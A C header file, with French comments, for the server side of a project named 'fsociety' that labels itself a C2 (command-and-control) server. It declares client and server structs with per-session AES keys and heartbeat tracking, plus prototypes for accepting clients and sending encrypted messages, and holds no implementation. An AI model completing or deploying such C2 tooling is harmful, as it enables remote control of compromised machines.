#ifndef FSO_SERVER_H
#define FSO_SERVER_H
#include "protocol.h"

#include <stdint.h>
#include <time.h>
#include <netinet/in.h>

/* ============================================================
 * fsociety — Serveur C2
 * ============================================================ */

#define FSO_DEFAULT_PORT   8443
#define FSO_BACKLOG        10
#define FSO_MAX_CLIENTS    16

/* État d'un client connecté. */
typedef struct {
    int      fd;
    uint32_t ip;
    uint16_t port;
    int      active;
    uint8_t  aes_key[32];   /* clé AES de session */
    int      has_key;       /* 1 si la clé est définie */
    time_t   last_ping;     /* dernier MSG_PING envoyé */
    time_t   last_pong;     /* dernier MSG_PONG reçu */
} fso_client_t;

/* État du serveur. */
typedef struct {
    int           listen_fd;                 /* socket d'écoute */
    uint16_t      port;                      /* port d'écoute */
    struct sockaddr_in addr;                 /* adresse d'écoute */
    fso_client_t  clients[FSO_MAX_CLIENTS];  /* clients connectés */
    int           nclients;                  /* nombre de clients actifs */
} fso_server_t;

/* ---------- Cycle de vie ---------- */

int fso_server_init(fso_server_t *srv, uint16_t port);
int fso_server_accept(fso_server_t *srv);
int fso_server_disconnect(fso_server_t *srv, int client_idx);
void fso_server_close(fso_server_t *srv);

/* ---------- I/O ---------- */

ssize_t fso_server_send(fso_server_t *srv, int idx,
                        const void *buf, size_t len);

ssize_t fso_server_recv(fso_server_t *srv, int idx,
                        void *buf, size_t len);

int fso_server_send_secure(fso_server_t *srv, int idx,
                           uint8_t type, uint16_t seq_id,
                           const uint8_t *payload, uint32_t payload_len);

int fso_server_recv_secure(fso_server_t *srv, int idx,
                           fso_header_t *header_out,
                           uint8_t *payload_out, size_t payload_size);

/* ---------- Utilitaires ---------- */

const char *fso_server_client_ip(const fso_server_t *srv, int idx);

ssize_t fso_server_recv_exact(fso_server_t *srv, int idx,
                              void *buf, size_t len);

#endif /* FSO_SERVER_H */